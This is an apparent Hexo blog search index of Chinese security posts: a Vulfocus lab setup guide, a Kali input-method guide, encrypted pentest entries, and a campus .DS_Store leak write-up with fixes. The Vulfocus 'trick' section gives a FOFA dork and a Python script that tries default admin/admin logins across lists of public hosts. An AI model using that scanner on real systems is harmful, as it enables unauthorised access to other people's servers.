<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>搭建Vulfocus快速进行漏洞复现及靶场搭建</title>
      <link href="2021/01/26/Vulfocus-build/"/>
      <url>2021/01/26/Vulfocus-build/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用docker可以快速、方便地搭建各种靶场和漏洞环境。</p><p>而Vulfocus是一个漏洞集成平台，可将漏洞环境docker镜像，放入即可使用，开箱即用。</p></blockquote><p>Github：<a href="https://github.com/fofapro/vulfocus">https://github.com/fofapro/vulfocus</a></p><p>文档：<a href="https://fofapro.github.io/vulfocus/">https://fofapro.github.io/vulfocus/</a></p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><pre><code class="bash">apt install docker docker-compose</code></pre><h2 id="拉取Vulfocus镜像"><a href="#拉取Vulfocus镜像" class="headerlink" title="拉取Vulfocus镜像"></a>拉取Vulfocus镜像</h2><pre><code class="bash">docker pull vulfocus/vulfocus:latest</code></pre><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2021/01/26/sXQ8cF.png"  alt="image.png"></p><h2 id="运行Vulfocus容器"><a href="#运行Vulfocus容器" class="headerlink" title="运行Vulfocus容器"></a>运行Vulfocus容器</h2><pre><code class="bash">docker run -d -p 8089:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=192.168.0.102 vulfocus/vulfocus</code></pre><ul><li><code>-e VUL_IP=192.168.0.102</code> 为本机 IP</li><li>默认账户密码为 <code>admin/admin</code></li></ul><p>浏览器访问 <a href="http://192.168.0.102:8089/">http://192.168.0.102:8089</a> 进行登录，进去第一件事情修改密码<br><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2021/01/26/sXKqMQ.png"  alt="image.png"></p><h3 id="靶场docker镜像"><a href="#靶场docker镜像" class="headerlink" title="靶场docker镜像"></a>靶场docker镜像</h3><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2021/01/26/sXKOqs.png"  alt="image.png"></p><h3 id="从本地docker镜像中导入"><a href="#从本地docker镜像中导入" class="headerlink" title="从本地docker镜像中导入"></a>从本地docker镜像中导入</h3><p>本地已经准备了如下几个靶场容器环境：</p><pre><code class="bash">docker pull area39/pikachudocker pull citizenstig/dvwadocker pull acgpiano/sqli-labs</code></pre><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2021/01/26/sXKjZn.png"  alt="image.png"></p><h3 id="首页直接启动靶场容器"><a href="#首页直接启动靶场容器" class="headerlink" title="首页直接启动靶场容器"></a>首页直接启动靶场容器</h3><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2021/01/26/sXKLrj.png"  alt="image.png"><br><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2021/01/26/sXQE6g.png"  alt="image.png"></p><h2 id="小Trick"><a href="#小Trick" class="headerlink" title="小Trick"></a>小Trick</h2><p>Fofa Dork：<code>app=&quot;白帽汇-vulfocus&quot;</code></p><p>Vulfocus默认用户名密码是<code>admin/admin</code>，可根据这个默认密码编写脚本批量登录，用以测试公网上有多少使用默认密码的Vulfocus。</p><p>登录的HTTP数据包：</p><pre><code class="http">POST /api/user/login HTTP/1.1Host: x.x.x.x:8002Connection: keep-aliveContent-Length: 39Pragma: no-cacheCache-Control: no-cacheAccept: application/json, text/plain, */*DNT: 1User-Agent: Mozilla/5.0 (X11; SunOS sun4u; rv:84.0) Gecko/20100101 Firefox/84.0Content-Type: application/json;charset=UTF-8Origin: http://x.x.x.x:8002Referer: http://x.x.x.x:8002/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: sidebarStatus=0&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;</code></pre><p>Python代码demo：</p><pre><code class="python">def login(URL):    urls = []    headers = &#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.87 Safari/537.36&quot;    &#125;    data = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;    if os.path.isfile(URL):        with open(URL) as target:            urls = target.read().splitlines()    else:        urls = URL.split()    for url in urls:        loginURL = &quot;http://&quot; + url + &quot;/api/user/login&quot;        try:            resp = requests.post(loginURL, data=data, timeout=5, headers=headers)            resData = json.loads(resp.text)            if resData[&#39;token&#39;] != None:                print(url + &quot; Login Success&quot;)                with open(&quot;success.txt&quot;, &quot;a+&quot;) as f:                    f.write(url + &quot;\n&quot;)            else:                pass        except:            print(url + &quot; Login Failed&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xfce桌面下Kali Linux的中文输入法配置</title>
      <link href="2021/01/03/linuxRimeInput/"/>
      <url>2021/01/03/linuxRimeInput/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Linux上的输入法有商业公司的搜狗输入法，也有开源的输入法框架iBus和Fcitx；搜狗输入法基本安装/开箱即用，很是方便，但是商业公司有收集隐私的癖好，并且由于输入法软件掌握着我们的输入入口，这让注重隐私的我不得不重视。</p><p>而且对于刚刚使用Linux的、并希望将其作为主系统的新手来说，配置一款顺手的中文输入法是那么的至关重要，但是却不是那么容易。</p></blockquote><h2 id="0x00-fcitx5框架安装"><a href="#0x00-fcitx5框架安装" class="headerlink" title="0x00 fcitx5框架安装"></a>0x00 fcitx5框架安装</h2><p>Fcitx5是继Fcitx后的新一代输入法框架。</p><p>卸载原自带的fcitx以及fcitx-rime：</p><pre><code class="zsh">$ sudo apt remove fcitx fcitx-rime:amd64</code></pre><p>注销用户或者重启系统之后再安装fcitx5：</p><pre><code class="zsh">$ sudo apt install fcitx5</code></pre><h2 id="0x01-环境变量配置"><a href="#0x01-环境变量配置" class="headerlink" title="0x01 环境变量配置"></a>0x01 环境变量配置</h2><p>创建一个名为<code>.pam_environment </code>的环境变量文件，输入如下内容：</p><pre><code class="zsh">$ cat ~/.pam_environmentGTK_IM_MODULE DEFAULT=fcitxQT_IM_MODULE  DEFAULT=fcitxXMODIFIERS    DEFAULT=\@im=fcitxSDL_IM_MODULE DEFAULT=fcitx</code></pre><h2 id="0x02-中文输入法引擎"><a href="#0x02-中文输入法引擎" class="headerlink" title="0x02 中文输入法引擎"></a>0x02 中文输入法引擎</h2><p>安装fcitx5-rime：</p><pre><code class="zsh">$ sudo apt install fcitx5-rime</code></pre><p>在Fcitx Configuration中的Input Method中添加rime中文输入法：</p><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2021/01/03/s96yNV.png"  alt="Rime"></p><p>切换输入法的默认快捷键是<code>Control</code>+<code>Space</code>，注意不要与其他快捷键冲突。可以通过如下界面修改：</p><p><img src="/" class="lazyload" data-src="https://ftp.bmp.ovh/imgs/2021/01/967a0b153d2aee89.png"  alt="shortcut"></p><h2 id="0x03-皮肤主题"><a href="#0x03-皮肤主题" class="headerlink" title="0x03 皮肤主题"></a>0x03 皮肤主题</h2><p>fcitx5输入法的皮肤可以在Github上搜索到一些别人制作好了的，我使用的是：<a href="https://github.com/sxqsfun/fcitx5-sogou-themes">https://github.com/sxqsfun/fcitx5-sogou-themes</a></p><h4 id="Alpha-white-2-0"><a href="#Alpha-white-2-0" class="headerlink" title="Alpha-white-2.0"></a>Alpha-white-2.0</h4><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/sxqsfun/fcitx5-sogou-themes@master/Alpha-white-2.0/h.png"  alt="Alpha-white-2.0"></p><h4 id="Alpha-black"><a href="#Alpha-black" class="headerlink" title="Alpha-black"></a>Alpha-black</h4><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/sxqsfun/fcitx5-sogou-themes@master/Alpha-black/h.png"  alt="Alpha-black"></p><h4 id="Alpha-white-2-0-1"><a href="#Alpha-white-2-0-1" class="headerlink" title="Alpha-white-2.0"></a>Alpha-white-2.0</h4><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/sxqsfun/fcitx5-sogou-themes@master/Alpha-white-2.0/h.png"  alt="Alpha-white-2.0"></p><h4 id="Alpha-white"><a href="#Alpha-white" class="headerlink" title="Alpha-white"></a>Alpha-white</h4><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/sxqsfun/fcitx5-sogou-themes@master/Alpha-white/h.png"  alt="Alpha-white"></p><p>首先先clone到本地：</p><pre><code class="zsh">$ git clone https://github.com/sxqsfun/fcitx5-sogou-themes.git</code></pre><p>然后再将各个皮肤主题移动到fcitx5的theme目录：</p><pre><code class="zsh">$ cd fcitx5-sogou-themes &amp;&amp; cp * /usr/share/fcitx5/themes/</code></pre><p>然后再桌面右上角点击Fcitx图标中的Configure进入如下图所示的Fcitx Configuration中，先点击Addons然后找到Classic User Interface，进入到Configure，就可以切换Theme了~</p><p><img src="/" class="lazyload" data-src="https://ftp.bmp.ovh/imgs/2021/01/966e6a2a2d91e26c.png"  alt="theme"></p><h2 id="0x04-自定义词库配置"><a href="#0x04-自定义词库配置" class="headerlink" title="0x04 自定义词库配置"></a>0x04 自定义词库配置</h2><p>Linux下rime的配置目录位于：<code>~/.local/share/fcitx5/rime</code></p><p>在此直接配置，讲解各个文件的作用对于新手意义不大。</p><h3 id="扩充词库"><a href="#扩充词库" class="headerlink" title="扩充词库"></a>扩充词库</h3><p>先clone他人收集的词库到本地：</p><pre><code class="zsh">$ git clone https://github.com/rime-aca/dictionaries$ cd dictionaries/luna_pinyin.dict &amp;&amp; lsdouble_pinyin.custom.yamlluna_pinyin.cn_en.dict.yamlluna_pinyin.custom.yamlluna_pinyin.extended.dict.yamlluna_pinyin.hanyu.dict.yamlluna_pinyin.poetry.dict.yaml</code></pre><p>将后5个文件移动到rime配置目录：</p><pre><code class="zsh">$ cp luna_pinyin* ~/.local/share/fcitx5/rime/</code></pre><h3 id="切换简体中文输入"><a href="#切换简体中文输入" class="headerlink" title="切换简体中文输入"></a>切换简体中文输入</h3><p>将<code>luna_pinyin.custom.yaml</code>修改成<code>luna_pinyin_simp.custom.yaml</code>，不然就是繁体字。</p><pre><code class="zsh">$ cd ~/.local/share/fcitx5/rime/ &amp;&amp; mv luna_pinyin.custom.yaml luna_pinyin_simp.custom.yaml</code></pre><h3 id="全局配置文件"><a href="#全局配置文件" class="headerlink" title="全局配置文件"></a>全局配置文件</h3><p>创建一个名为<code>default.custom.yaml</code>的文件，并编辑。</p><pre><code class="zsh">$ vim default.custom.yaml</code></pre><p>添加如下基础配置：</p><pre><code class="vim">patch:  # 简体中文  schema_list:    - schema: luna_pinyin_simp      # 5个候选词  &quot;menu/page_size&quot;: 7    # 以方括号 [ ] 来换页  key_binder/bindings:    - when: paging      accept: bracketleft      send: Page_Up    - when: has_menu      accept: bracketright      send: Page_Down</code></pre><h3 id="模糊音设置"><a href="#模糊音设置" class="headerlink" title="模糊音设置"></a>模糊音设置</h3><p>编辑<code>luna_pinyin_simp.custom.yaml</code>文件，添加如下内容至行尾：</p><pre><code class="vim">  # 模糊音  &quot;speller/algebra&quot;:      - derive/^([zcs])h/$1/ #zh,ch,sh-&gt;z,c,s      - derive/^([zcs])([^h])/$1h$2/ #z,c,s-&gt;zh,ch,sh      - derive/ou$/uo/          # 模糊拼音 ou =&gt; uo      - derive/uo$/ou/          # 模糊拼音 uo =&gt; ou      - derive/([ei])n$/$1ng/  # en -&gt; eng, in -&gt; ing      - derive/([ei])ng$/$1n/  # eng-&gt;en, ing -&gt; in      - abbrev/^([a-z]).+$/$1/ #简拼支持      - abbrev/^([zcs]h).+$/$1/ #模糊音的简拼支持      delimiter: &quot; &#39;&quot; #分隔符</code></pre><h3 id="彩色Emoji"><a href="#彩色Emoji" class="headerlink" title="彩色Emoji"></a>彩色Emoji</h3><p>首先需要先在系统上安装TwitterColorEmoji字体。</p><p>去<a href="https://github.com/eosrei/twemoji-color-font/releases">https://github.com/eosrei/twemoji-color-font/releases</a>下载最新release：</p><pre><code class="zsh">$ wget https://github.com/eosrei/twemoji-color-font/releases/download/v13.0.1/TwitterColorEmoji-SVGinOT-Linux-13.0.1.tar.gz</code></pre><p>解压并执行安装脚本：</p><pre><code class="zsh">$ tar zxf TwitterColorEmoji-SVGinOT-Linux-13.0.1.tar.gz &amp;&amp; cd TwitterColorEmoji-SVGinOT-Linux-13.0.1 &amp;&amp; ./install.sh</code></pre><p>再然后clone<a href="https://github.com/rime/rime-emoji">rime-emoji</a>到本地：</p><pre><code class="zsh">$ git clone https://github.com/rime/rime-emoji</code></pre><p>将opencc目录移动到rime配置文件目录：</p><pre><code class="zsh">$ cd rime-emoji &amp;&amp; cp -r opencc ~/.local/share/fcitx5/rime</code></pre><p>将<code>emoji_suggestion.yaml</code>文件中的内容复制到<code>luna_pinyin_simp.custom.yaml</code>中。</p><pre><code class="zsh">$ cat emoji_suggestion.yaml# encoding: utf-8patch:  switches/@next:    name: emoji_suggestion    reset: 1    states: [ &quot;🈚️️\uFE0E&quot;, &quot;🈶️️\uFE0F&quot; ]  &#39;engine/filters/@before 0&#39;:    simplifier@emoji_suggestion  emoji_suggestion:    opencc_config: emoji.json    option_name: emoji_suggestion    tips: all</code></pre><p>重启Fcitx5，即可。</p><h2 id="0x05-汇总"><a href="#0x05-汇总" class="headerlink" title="0x05 汇总"></a>0x05 汇总</h2><p>rime目录下所有配置文件及文件夹：</p><pre><code class="zsh">$ cd ~/.local/share/fcitx5/rime &amp;&amp; lsbuild                           luna_pinyin.poetry.dict.yamldefault.custom.yaml             luna_pinyin_simp.custom.yamlinstallation.yaml               luna_pinyin.userdbluna_pinyin.cn_en.dict.yaml     openccluna_pinyin.extended.dict.yaml  user.yamlluna_pinyin.hanyu.dict.yaml</code></pre><h3 id="default-custom"><a href="#default-custom" class="headerlink" title="default.custom"></a>default.custom</h3><p>其中<code>default.custom.yaml</code>文件所有内容如下：</p><pre><code class="zsh">$ cat default.custom.yamlpatch:  # 简体中文  schema_list:    - schema: luna_pinyin_simp      # 7个候选词  &quot;menu/page_size&quot;: 7    # 以方括号 [ ] 来换页  key_binder/bindings:    - when: paging      accept: bracketleft      send: Page_Up    - when: has_menu      accept: bracketright      send: Page_Down</code></pre><h3 id="luna-pinyin-simp-custom"><a href="#luna-pinyin-simp-custom" class="headerlink" title="luna_pinyin_simp.custom"></a>luna_pinyin_simp.custom</h3><p><code>luna_pinyin_simp.custom.yaml</code>文件所有内容如下：</p><pre><code class="zsh">$ cat luna_pinyin_simp.custom.yamlpatch:  # 載入朙月拼音擴充詞庫  &quot;translator/dictionary&quot;: luna_pinyin.extended  # 改寫拼寫運算，使得含西文的詞彙（位於 luna_pinyin.cn_en.dict.yaml 中）不影響簡拼功能（注意，此功能只適用於朙月拼音系列方案，不適用於各類雙拼方案）  # 本條補靪只在「小狼毫 0.9.30」、「鼠鬚管 0.9.25 」、「Rime-1.2」及更高的版本中起作用。  &quot;speller/algebra/@before 0&quot;: xform/^([b-df-hj-np-tv-z])$/$1_/    # 模糊音  &quot;speller/algebra&quot;:      - derive/^([zcs])h/$1/ #zh,ch,sh-&gt;z,c,s      - derive/^([zcs])([^h])/$1h$2/ #z,c,s-&gt;zh,ch,sh      - derive/ou$/uo/          # 模糊拼音 ou =&gt; uo      - derive/uo$/ou/          # 模糊拼音 uo =&gt; ou      - derive/([ei])n$/$1ng/  # en -&gt; eng, in -&gt; ing      - derive/([ei])ng$/$1n/  # eng-&gt;en, ing -&gt; in      - abbrev/^([a-z]).+$/$1/ #简拼支持      - abbrev/^([zcs]h).+$/$1/ #模糊音的简拼支持      delimiter: &quot; &#39;&quot; #分隔符  # rime-emoji  switches/@next:    name: emoji_suggestion    reset: 1    states: [ &quot;🈚️️\uFE0E&quot;, &quot;🈶️️\uFE0F&quot; ]  &#39;engine/filters/@before 0&#39;:    simplifier@emoji_suggestion  emoji_suggestion:    opencc_config: emoji.json    option_name: emoji_suggestion    tips: all</code></pre><h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><p>Fcitx5 - ArchWiki: <a href="https://wiki.archlinux.org/index.php/Fcitx5">https://wiki.archlinux.org/index.php/Fcitx5</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次由敏感信息泄露到针对Postgresql的渗透测试</title>
      <link href="2020/12/03/PostgresqlPentestViaInfoLeak/"/>
      <url>2020/12/03/PostgresqlPentestViaInfoLeak/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容">  <script id="hbeData" type="hbeData" data-hmacdigest="a2d539d18b79b09e5613997b21dd4431e3bb6276c9b81c72ab0f7f3f41d21f0b">3e85b10c80621444b5d02f0866d7572b96231d185225022434668d3fca9999b41c1bea5fbffc500cdcd389e58e27ef54ec158dbbf0db64afe97e4c20489531296c15981a3c16b85d47e9866f86fe3df4d25a026646f9e33dc1a3c1ab336b6302a766db16afca610cacdda84aaa02fb04e9dd5e6ec9d763fcdce41f2e25e77919bfd40b4ccd12c86e9a49d20fe6fa65fada7c9375fd4994cbe47804706520b40cff46cfd34702b7dce97350d3e0413ed530b683dee2089828d99ad30db735df417fcfe5e361475a892fb3d08c2640121162a61b8192b46fa78aa65b00c8e6ca8d62c05c1011459cb9f62cb816f3a864a9456d9196cd856dbbf053375e3b72eb4f554c9bf4f909a5b985768f2b86ce221f952bb9c2eae36a8dc1ff9f9b8175ada028e228d8b899cf1bd472957e0f699d209001e5befd4feff0490b04263980965fc9d3a12ff5336145196a6712d869da77a35345b95c69a78d98896467be703c25924eab0b8350e9b0bb219ffbc8b613e0ce3d9474bc2ce89ade538e90f90fef36f91b8a0c285fe79a596c701a98205933929c6c7cd53cca1d2c2cfae07505564514784663de95d51db5a1ee6574512a22b15605a450176e82fba7efd14ac3c4ad5a9eaeb138562434063a242c59ba8e73a5efe39cf3706b570c1e0e6fd13fe1a34ab937937143435f84d95e286af47e31bd9a5d1644a9f1e336769fd4fc64935d0bef33920a7b0cf0056509897c4bb90967b02239af75462a7c49affa66e8a0013f445b847e22ff2d0e70c5f72f5c1acbab4b6508453aa87ce828ea051ba41ee18fb6297cad2dba2319824230c1bbb1cdf9d00cb11837d55fa83669c7237b0a1bb7f7e8f702bdd7fc9758b79551a8774fdbbe90bde7221515d33f83b46ca5343d6565330dcabb153f5ca9583dc83dfbb1d0e2b3b51e27bc5be81ed7f6bbbcc70b4e2f912609d0fced746a06d80a9d44743b0c7484ba24c8de7305dcc84789af64555ca175e6ee93e064aaf1933c1e2f70cdf2aa57515e8bb43eb0654b8cdd7b8830cfbf42bc9c34425a0de71bca7852f82516dfb5b09f655b64f8e89a4298cfb627495fb116c9a2c1fb3c79d883eb2252ae726dfff69969158500aba6bb32ee60f822d884d1ffef76ccb7b5a471f9fbf770128b247afc72a64f44d60390162bcbd2d544bf069cba088ba126a0592771b60cf2bc016d76ee0ab181122e7d755e800c56410d7925e462ee8d8fb61084b55fcdacd9b128de5769043ff56199a877c9730347e7d6d34a36e0abd91f16b593abb40167775caf03498db5681a7bf9129f152ac693bf51ae1efdca23ddb9da5714073adcdc04961cf29fae8567460f1555ef510fe21f72a21952443848f266be070cfac1680d98bd9bb7b321c653d06ab44db4e7ebae07ce4712760aaff9eed0e3d0e0cb644169c2599761a31f528bb45d8c6797b76f8a5fe57b00c2f29725e84c2a7b62a0df9f43f17839957b31c2ad3c76baf553cf95f466120d1dc1021eeaad087c208bd729aeb3a47641c0aa04fb11686505fb7336cc2c180885673c69973df15c86134e211ade2e4263b389022f432e99720fe68a1be99951a2f9010b3cb52ec126f366fef52aef63df62e08c3b6e05fabe4c9766f49877f1644af8b6ce4f48f755e6272d2993abb90deee6737e45ac1a5b49931612707f983f342018295a3731348ad38a5e50dc85035b64ad0032f7747e62df8cdb45ba7b4c79e2d49c0fe226dbb87e611be2062c3d55e890917030a6d72fe8a42186d770e22df30b768699813b4ba41b4029fe82829e4348d410f9621a52e485fefbe133a5c39bea88fc639c9ff3be8c918288018862d090154c59ace04ac88e0a66800e95ded302ac19c3cdb810a9dd88a9698a03a8b73f4b255e6a9c77772a77ee94650b2b790818b18d84e7a4c40ed4d751ab7c1a9116d2ab5752bcbfbbe0a5a9ca4a9fc249fc3a70bb7ba7b19758a6a6b8d942e793232ad359824abf7411a6468b3506e75ba91a1465da683bf75e7119f335cc7c5f987e430443634c231bae73049f8fa2d8806903e176c0d933d3a1c3ccec232f7b7a6a8233273709f789202cb449dc25c52824b0b8d243214ec9d97295dab28ed74eaf1f0b77f94325a77966a090c7910ff626afebeb8d41bdfc5b000aa715df03248469527588ff02696dfe71fe7ac28ffb4d4aabd7284f68558da7e7d2b20d39fbbd385c0d958f399808b59a3de9faa4a71355768406116a59d9dae2781a64ab7eec25338b92ebc16c5a008c5285dbbc00f815cf8ee356ba566f113301f02863f76557d6e6ad7b2fb34d8a84c60b52e8690b7b4fa7db297a181f308ed8a47728883a7a5b0a688b22296984d257ea928a2caa05881116998baa6c3a40dd8be960f23ec88a62c7e9ef751cbffaf5dd7b1469dd50c33064befb0261b55b6d85a090184d5644851992f10b5aeca763b2b9f52525c9d5414647c165d301485b5c0f3786532dfa7e55cc5241b1f45957d90b3d21b82b1aa4154ef4787b3aaa2c32babb896b79b08fe70611c45ee077ba8b448a9f7b96a3c5ef491da8a90abfe45e6f63986045c2bc3cfc2af26dad694a189baa80d6297d5d85051fd4b4ee5d31162638c2a87ece979a2787db5a9e93f6a4b744e2f9676de0dd855fb68f4a3f2b30b15eefe736bd459769ec8d386840e0b20c625da6eb31e99bdf02b8e65d4546d2815fdb79b7fc53764ba2b9d68474212616b3ae542fa628c84be61d27a2b13f09fed7e0d05923c672c25ccbcff7e2b0a4b613dcc0008fdda087e6ab03ab05dc65080899bfbbcb948bddb969f0a7c3f74743ee2c088cb61f1dfce09fe343ab902829033cb365f5bd39b3a6c20239245ef66f4823374411fdc04aff70ca2ece1f1b5a8315cfeea5718da31defb89daaa4ddaafd8f977ce4b4459df2d2fe1ace9f6bacbe546085345591f77a790798c50591324d19caa2ec5a3ce5ca0b2eb6e6dd8600f6ff4da026e99c15ca36d4ceb0e4f8231a04567ed0171733c012a009f5a90ec1d570a851566ddb8bf83cf9e34cafdabaeeb4c77c359cb51d8fb97512da6d9c9cd0a219c04f641fc50c22b30662627d9b603dbf5225aceebe13b029acb1cb6edd1bbe440b4dbbdbfa1f00f7de585391d88331a6fa192857947513da9d3a70736baa5a2d42457b90a1865077f509be67706c23d8a24f5119f58fdbc31c731e6db96206911b57048ef2bda8068f8b6c8b368c0181b5040835fb097752951c17e8d7f59402d5a1a20db12c72d2851d0688bc452b2bf9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校园内多个站点存在未授权访问漏洞</title>
      <link href="2020/11/29/campusUnauth/"/>
      <url>2020/11/29/campusUnauth/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容">  <script id="hbeData" type="hbeData" data-hmacdigest="e2f72844d85951ce7e34c4f1bf43a904fe0b4b3641693dceb81124682053cfc8">bde118e8f5e24a1e68f36367ae96f5e5d12962f5a2cc69ac54066faba6b13f08</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>校园内某站存在SVN信息泄露漏洞</title>
      <link href="2020/11/29/campusSVNInfoLeak/"/>
      <url>2020/11/29/campusSVNInfoLeak/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容">  <script id="hbeData" type="hbeData" data-hmacdigest="e2f72844d85951ce7e34c4f1bf43a904fe0b4b3641693dceb81124682053cfc8">bde118e8f5e24a1e68f36367ae96f5e5d12962f5a2cc69ac54066faba6b13f08</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>校园内某站存在Ds_Store信息泄露漏洞</title>
      <link href="2020/11/29/campusDsStoreInfoLeak/"/>
      <url>2020/11/29/campusDsStoreInfoLeak/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-DS-Store文件简介"><a href="#0x00-DS-Store文件简介" class="headerlink" title="0x00 DS_Store文件简介"></a>0x00 DS_Store文件简介</h2><p>.DS_Store (全称Desktop Services Store) 是一种由苹果公司的macOS系统所创造的一个隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。</p><p>查看.DS_Store内容可以发现一些文件名以及Finder的属性。</p><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2020/11/29/DgwbqJ.png"  alt="catDS"></p><p>如果开发人员将.DS_Store文件与开发项目一同上传到线上环境，则可能造成文件目录结构、源代码、备份文件泄漏。</p><p>在针对校园网进行渗透测试的过程中就发现如下站点存在此漏洞。</p><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2020/11/29/DgwoxU.png"  alt="WebHome"></p><h2 id="0x01-漏洞探测利用工具"><a href="#0x01-漏洞探测利用工具" class="headerlink" title="0x01 漏洞探测利用工具"></a>0x01 漏洞探测利用工具</h2><h3 id="ds-store-exp"><a href="#ds-store-exp" class="headerlink" title="ds_store_exp"></a>ds_store_exp</h3><p>ds_store_exp是一个.DS_Store文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。</p><p><a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2020/11/29/DgwLZ9.png"  alt="tools"></p><h2 id="0x02-对源码进行审计"><a href="#0x02-对源码进行审计" class="headerlink" title="0x02 对源码进行审计"></a>0x02 对源码进行审计</h2><p>对下载下来的源码进行审计，发现下载下来的都是一些HTML静态文件，并且这还是一个功能不完善的系统。例如说login.jsp这个页面，登录不登录都完全不影响使用。</p><p>还有请求如下图的input_info.jsp文件，直接报500了。</p><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2020/11/29/DgwHr4.png"  alt="500nocode"></p><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2020/11/29/Dgw7MF.png"  alt="input_info500"></p><p>这个文件也没下载下来。</p><p>根据本人对学校的了解，可以猜测出大致情况就是，这个系统原本是部署在公网的，也就是公网可以访问到这个网站/系统。但是呢，由于input_info.jsp这个页面存在某些漏洞被公网的其他人攻击，所以校方网站维护人员将此系统设置了一道防火墙，不允许公网访问，只允许校园内网访问此系统；并且这个写的有漏洞的页面估计七改八改改出问题了，导致访问出现500。根据input_info.jsp这个文件名，猜测这里可能存在文件上传漏洞！</p><h2 id="0x03-解决方案"><a href="#0x03-解决方案" class="headerlink" title="0x03 解决方案"></a>0x03 解决方案</h2><p>网站运维人员应立即删除.DS_Store文件。</p><p>另外为避免下次出现此漏洞，开发人员应该在macOS系统环境下打开终端，输入以下命令来禁用.DS_store生成。重启生效。</p><pre><code class="zsh">$ defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool TRUE</code></pre><p>如果要启用.DS_store生成，使用下边命令：</p><pre><code class="zsh">$ defaults delete com.apple.desktopservices DSDontWriteNetworkStores</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露漏洞 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于科学上网的安全问题</title>
      <link href="2020/11/25/OverTheWallOfSecurity/"/>
      <url>2020/11/25/OverTheWallOfSecurity/</url>
      
